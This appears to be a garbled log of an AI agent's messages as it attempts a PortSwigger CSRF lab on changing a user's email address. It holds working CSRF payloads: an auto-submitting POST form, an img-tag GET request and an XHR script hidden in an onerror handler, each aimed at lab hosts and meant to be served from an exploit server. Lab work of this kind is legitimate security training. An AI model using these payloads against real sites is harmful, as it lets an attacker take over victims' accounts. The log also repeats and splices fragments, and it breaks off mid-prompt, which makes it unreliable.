{"event": "assistant_message", "timestamp": "2025-07-22T14:12:20.716416+02:00", "content": "### Step 1 \u2013 Analyze Objective:\nThe lab aims to teach how to exploit a CSRF vulnerability where token validation only applies to certain request methods. Your task is to create a CSRF attack by hosting an exploit page that changes the user's email address despite these token validations.\n\n### Step 2 \u2013 Access and Prepare:\n- **URL:** [Lab Environment](https://0a6c0058045481aa809e03bb00e4003c.web-security-academy.net/)\n- **COOKIES:** Provided in the lab description.\n\nFirst, let's verify access to the lab environment using the provided cookies.\n\n### Step 3 \u2013 Identify Vulnerable Parameter:\nThe vulnerable parameter is likely in the form or endpoint responsible for updating the user's email address. This endpoint usually involves an HTML form with a `POST` method to update the email. We will look for:\n\n- An endpoint like `/my-account/change-email`.\n- The `email` parameter specifically.\n\n### Step 4 \u2013 Payloads to Test:\nGiven the context, we'll test payloads by using different HTTP methods to bypass CSRF protections.\n\n**Payload 1: Form with POST Method**\n\n```html\n<form action=\"https://0a6c0058045481aa809e03bb00e4003c.web-security-academy.net/my-account/change-email\" method=\"POST\" enctype=\"application/x-www-form-urlencoded\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\">\n  <input type=\"submit\" value=\"Submit request\">\n</form>\n```\n\n**Payload 2: Form with GET Method (if applicable)**\n\n```html\n<img src=\"https://0a6c0058045481aa809e03bb00e4003c.web-security-academy.net/my-account/change-email?email=attacker@example.com\">\n```\n\n### Step 5 \u2013 Execute and Observe:\nWe'll use the exploit server to host the payloads and observe the behavior:\n\n1. **Host Payload:**\n   - Go to the exploit server provided (`exploit-server.net`) and upload the HTML with the CSRF form.\n\n2. **Trigger the CSRF:**\n   - Access the URL of the uploaded HTML through the exploit server while logged into the target lab with the provided cookies.\n\n### Step 6 \u2013 Result:\nThe payload is considered successful if the email address changes to `attacker@example.com` without requiring any CSRF token verification, and a confirmation message such as \"Congratulations, you solved the lab!\" should appear.\n\n### Step 7 \u2013 Final Summary:\n- **Vulnerable Parameter:** The `email` parameter in the change-email form.\n- **Successful Payload:** Likely the one using the POST method, as it's the standard method for form submissions. We need to verify the HTTP method regarding how CSRF token validation is improperly applied. \n\nThe next steps would include implementing these payloads on the provided exploit server to observe and confirm exploitation."}

Given that we have access to account settings, we're looking for an endpoint like `/account/change-email` that would accept a `POST` request to change the email.\n\n### Step 4 \u2013 Payloads to Test:\nBased on usual CSRF patterns, we'll focus on HTML forms that can be submitted automatically when loaded in a browser. Here are two payloads we will test:\n\n**Payload 1: Simple CSRF Form**\n```html\n<form action=\"https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/my-account/change-email\" method=\"POST\" enctype=\"application/x-www-form-urlencoded\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\">\n  <input type=\"submit\" value=\"Submit request\">\n</form>\n```\n\n**Payload 2: Automated CSRF Script**\n```html\n<img src=\"#\" onerror=\"\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://0aa50092045cc62c80400d03004d0086.web-security-academy.net/my-account/change-email', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('email=attacker@example.com');\n\">\n```\n\n### Step 5 \u2013 Execute and Observe:\nNow, we'll upload these payloads to the provided exploit server and access them through a web browser to test their effectiveness. We'll perform these steps:\n\n1. **Upload the Payload to the Exploit Server:**\n   - Visit https://exploit-0a6f00ae0428c6ea80fc0c3401c80073.exploit-server.net/ and upload the payload under a file, such as `csrf-payload.html`.\n\n2. **Trigger the Payload:**\n   - With an authenticated session, visit the uploaded URL.\n   - Check if there are any changes or success messages from the lab server that confirm the email change.\n\n### Step 6 \u2013 Result:\nTo see if any payload was successful, we will look for a \"Congratulations, you solved the lab!\" message on the exploit server and an email address change confirmation.\n\n### Step 7 \u2013 Final Summary:\n- **Vulnerable Parameter:** Email parameter in the POST request of the email change functionality.\n- **Working Payload:** Likely the simple HTML form or the automated script, depending on which execution method is supported by the lab environment.\n\nWe will continue by implementing the payload upload and execution on the exploit server, keeping an eye on potential email changes or completed lab messages."}, {"role": "user", "content": "Use your knowledge as a highly specialized web bounty agent to solve a cybersecurity lab for testing and learning, created by PortSwigger.\nConsider the following rules:\n  5.

We will look for:\n\n- An endpoint like `/my-account/change-email`.\n- The `email` parameter specifically.\n\n### Step 4 \u2013 Payloads to Test:\nGiven the context, we'll test payloads by using different HTTP methods to bypass CSRF protections.\n\n**Payload 1: Form with POST Method**\n\n```html\n<form action=\"https://0a6c0058045481aa809e03bb00e4003c.web-security-academy.net/my-account/change-email\" method=\"POST\" enctype=\"application/x-www-form-urlencoded\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@example.com\">\n  <input type=\"submit\" value=\"Submit request\">\n</form>\n```\n\n**Payload 2: Form with GET Method (if applicable)**\n\n```html\n<img src=\"https://0a6c0058045481aa809e03bb00e4003c.web-security-academy.net/my-account/change-email?email=attacker@example.com\">\n```\n\n### Step 5 \u2013 Execute and Observe:\nWe'll use the exploit server to host the payloads and observe the behavior:\n\n1. **Host Payload:**\n   - Go to the exploit server provided (`exploit-server.net`) and upload the HTML with the CSRF form.\n\n2. **Trigger the CSRF:**\n   - Access the URL of the uploaded HTML through the exploit server while logged into the target lab with the provided cookies.\n\n### Step 6 \u2013 Result:\nThe payload is considered successful if the email address changes to `attacker@example.com` without requiring any CSRF token verification, and a confirmation message such as \"Congratulations, you solved the lab!\" should appear.\n\n### Step 7 \u2013 Final Summary:\n- **Vulnerable Parameter:** The `email` parameter in the change-email form.\n- **Successful Payload:** Likely the one using the POST method, as it's the standard method for form submissions.
